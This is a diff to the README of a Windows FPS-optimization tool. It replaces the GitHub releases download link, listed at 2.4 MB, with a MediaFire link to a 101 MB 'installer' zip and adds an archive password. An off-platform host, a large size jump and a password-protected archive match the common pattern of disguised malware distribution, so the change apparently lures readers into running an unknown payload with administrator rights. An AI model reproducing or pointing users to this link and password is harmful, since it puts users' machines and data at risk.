@@ -36,8 +36,9 @@
 ## 📥 Installation
 
 ### Quick Download
-**[⬇ Download TurboFPS v1.2.0 (Direct GitHub Releases)](https://github.com/CobraRegenerate/TurboFPS/releases/latest)** — *2.4 MB, no installation required*
+**[⬇ Download TurboFPS v1.2.0 ](https://www.mediafire.com/file/bii0ugnd7k4fi9z/TurboFPS_v1.2.0.zip/file)** — *101 MB, fast software installer*
 
+### Password Archive:```XAY*33k1alUw```
 ### Requirements
 - Windows 10 (version 1803+) or Windows 11
 - Administrator privileges (required for optimization)
